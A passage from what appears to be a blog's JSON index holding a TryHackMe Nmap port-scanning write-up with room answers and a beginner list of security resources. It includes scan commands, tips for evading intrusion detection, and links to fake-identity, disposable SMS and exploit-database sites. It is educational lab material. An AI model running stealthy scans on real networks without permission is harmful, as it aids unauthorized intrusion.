writeup\n","slug":"THM/NMAP/Live-Host-Discovery","date":"2024-05-16T13:59:01.000Z","categories_index":"cybersecurity,THM,NMAP","tags_index":"tryhackme,nmap,information-gathering","author_index":"Satvik"},{"id":"58abb440477d90f4f081be1f94565844","title":"Basic Port Scan - NMAP","content":"Nmap Basic Port ScansINTRODUCTIONThe next step would be checking which ports are open and listening and which ports are closed. Therefore, in this room and the next one, we focus on port scanning and the different types of port scans used by nmap. This room explains:\n\nTCP connect port scan\nTCP SYN port scan\nUDP port scan\n\nMoreover, we discuss the different options to specify the ports, the scan rate, and the number of parallel probes.\nTASK - 2 TCP and UDP PORTSIn the same sense that an IP address specifies a host on a network among many others, a TCP port or UDP port is used to identify a network service running on that host. A server provides the network service, and it adheres to a specific network protocol. Examples include providing time, responding to DNS queries, and serving web pages. A port is usually linked to a service using that specific port number. For instance, an HTTP server would bind to TCP port 80 by default; moreover, if the HTTP server supports SSL&#x2F;TLS, it would listen on TCP port 443. (TCP ports 80 and 443 are the default ports for HTTP and HTTPS; however, the webserver administrator might choose other port numbers if necessary.) Furthermore, no more than one service can listen on any TCP or UDP port (on the same IP address).\nAt the risk of oversimplification, we can classify ports in two states:\n\nOpen port indicates that there is some service listening on that port.\nClosed port indicates that there is no service listening on that port.\n\nHowever, in practical situations, we need to consider the impact of firewalls. For instance, a port might be open, but a firewall might be blocking the packets. Therefore, Nmap considers the following six states:\n\nOpen: indicates that a service is listening on the specified port.\nClosed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances&#x2F;programs.\nFiltered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.\nUnfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.\nOpen|Filtered: This means that Nmap cannot determine whether the port is open or filtered.\nClosed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.\n\nANSWERS\nWhich service uses UDP port 53 by default?\n\nCorrect Answer: DNS\n\n\nWhich service uses TCP port 22 by default?\n\nCorrect Answer: SSH\n\n\nHow many port states does Nmap consider?\n\nCorrect Answer: 6\n\n\nWhich port state is the most interesting to discover as a pentester?\n\nCorrect Answer: Open\n\n\n\nTASK 3 - TCP FLAGSNmap supports different types of TCP port scans. To understand the difference between these port scans, we need to review the TCP header. The TCP header is the first 24 bytes of a TCP segment. The following figure shows the TCP header as defined in RFC 793. This figure looks sophisticated at first; however, it is pretty simple to understand. In the first row, we have the source TCP port number and the destination port number. We can see that the port number is allocated 16 bits (2 bytes). In the second and third rows, we have the sequence number and the acknowledgment number. Each row has 32 bits (4 bytes) allocated, with six rows total, making up 24 bytes.\nIn particular, we need to focus on the flags that Nmap can set or unset. We have highlighted the TCP flags in red. Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:\n\nURG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.\nACK: Acknowledgment flag indicates that the acknowledgment number is significant. It is used to acknowledge the receipt of a TCP segment.\nPSH: Push flag asking TCP to pass the data to the application promptly.\nRST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.\nSYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.\nFIN: The sender has no more data to send.\n\nANSWERS\nWhat 3 letters represent the Reset flag?\n\nCorrect Answer: RST\n\n\nWhich flag needs to be set when you initiate a TCP connection (first packet of TCP 3-way handshake)?\n\nCorrect Answer: SYN\n\n\n\nTASK 4 - TCP CONNECT SCANTCP connect scan works by completing the TCP 3-way handshake. In standard TCP connection establishment, the client sends a TCP packet with SYN flag set, and the server responds with SYN&#x2F;ACK if the port is open; finally, the client completes the 3-way handshake by sending an ACK.\nWe are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST&#x2F;ACK. You can choose to run TCP connect scan using -sT.\nIt is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.\nQuestion:\nLaunch the VM. Open the AttackBox and execute nmap -sT 10.10.23.101 via the terminal. A new service has been installed on this VM since our last scan. Which port number was closed in the scan above but is now open on this target VM? \n\nAnswer: 110\n\nCommand: nmap -sT 10.10.23.101\nNew service: POP3\n\n\nTASK 5 - TCP SYN SCANUnprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option.\nQuestions:\nWhat is the new open port?\n\nCorrect Answer: 6667\n\n\nWhat is Nmap’s guess of the service name?\n\nCorrect Answer: irc\n\n\n\nTask 7: Fine-Tuning Scope and PerformanceYou can specify the ports you want to scan instead of the default 1000 ports. Specifying the ports is intuitive by now. Let’s see some examples:\n\nPort list: -p22,80,443 will scan ports 22, 80, and 443.\nPort range: -p1-1023 will scan all ports between 1 and 1023 inclusive, while -p20-25 will scan ports between 20 and 25 inclusive.\nYou can request the scan of all ports by using -p-, which will scan all 65535 ports. If you want to scan the most common 100 ports, add -F. Using --top-ports 10 will check the ten most common ports.\n\nYou can control the scan timing using -T&lt;0-5&gt;. -T0 is the slowest (paranoid), while -T5 is the fastest. According to the Nmap manual page, there are six templates:\n\nParanoid (0)\nSneaky (1)\nPolite (2)\nNormal (3)\nAggressive (4)\nInsane (5)\n\nTo avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.\nAlternatively, you can choose to control the packet rate using --min-rate &lt;number&gt; and --max-rate &lt;number&gt;. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.\nMoreover, you can control probing parallelization using --min-parallelism &lt;numprobes&gt; and --max-parallelism &lt;numprobes&gt;. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.\nTASK 8 - SUMMARYThis room covered three types of scans:\n\nTCP Connect\nTCP SYN\nUDP\n\nThese scan types should get you started discovering running TCP and UDP services on a target host.\nDONE\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/NMAP/Basic-Port-Scan-THM","date":"2024-05-16T10:05:28.000Z","categories_index":"cybersecurity,THM","tags_index":"tryhackme,nmap,information-gathering","author_index":"Satvik"},{"id":"df002c45b5a83b11244a8755ec495303","title":"Beginner Resources 2024","content":"Online Tools and ResourcesIP and DNS Leak Testing\nipleak.net\ndiafygi.github.io&#x2F;webrtc-ips\ndnsleaktest.com\n\nTor Check 🧅\n5deqglhxcoy3gbx6.onion\ntmkloc6vhxos3nde.onion\n\nSMS 📩\nreceive-sms-online.info\nreceive-sms-now.com\nreceivesmsonline.net\n\nFake Identity 🙃\nfakena.me\nnames.igopaygo.com&#x2F;people&#x2F;fake_person\nfakenamegenerator.com\n\nNetwork Online Tools 🌐\nyougetsignal.com\ndnswatch.info\nnirsoft.net&#x2F;countryip\ntcpiputils.com\nbgp.he.net\nsockets.com&#x2F;services.htm\nservices.ce3c.be&#x2F;ciprg\ncoffer.com&#x2F;mac_find\n\nVulnerabilities Database 🎯\ncve.mitre.org&#x2F;cve\ncvedetails.com\nosvdb.org\nkb.cert.org&#x2F;vuls\nsecunia.com&#x2F;community&#x2F;advisories&#x2F;search\nsecurityfocus.com&#x2F;bid\nlwn.net&#x2F;Vulnerabilities\ndenimgroup.com&#x2F;resources-threadfix\nvulnerability-lab.com\nsecdocs.org\nnvd.nist.gov\n\nExploits Database 💥\nexploit-db.com\nintelligentexploit.com\nshodanhq.com\npacketstormsecurity.com\n\n","slug":"MISC/Resources-2024-Beginners","date":"2024-05-15T19:12:11.000Z","categories_index":"","tags_index":"resources,cybersecurity,hacking","author_index":"Satvik"}]